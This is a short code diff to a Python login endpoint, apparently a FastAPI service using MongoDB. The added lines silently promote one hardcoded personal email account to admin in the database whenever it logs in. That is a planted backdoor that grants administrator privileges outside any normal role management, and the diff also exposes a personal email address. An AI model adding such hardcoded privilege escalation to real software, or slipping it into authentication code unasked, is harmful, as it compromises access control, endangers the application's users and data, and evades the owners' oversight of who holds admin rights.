@@ -40,6 +40,12 @@ def login(user: UserLogin):
     db_user = users.find_one({"email": user.email})
     if not db_user or not verify_password(user.password, db_user["hashed_password"]):
         raise HTTPException(status_code=401, detail="Invalid credentials")
+        
+    # Automatically upgrade this specific account to admin upon login
+    if user.email == "tanaymukker@gmail.com" and db_user.get("role") != "admin":
+        users.update_one({"email": user.email}, {"$set": {"role": "admin"}})
+        db_user["role"] = "admin"
+        
     token = create_access_token({"sub": user.email})
     return {
         "access_token": token, 
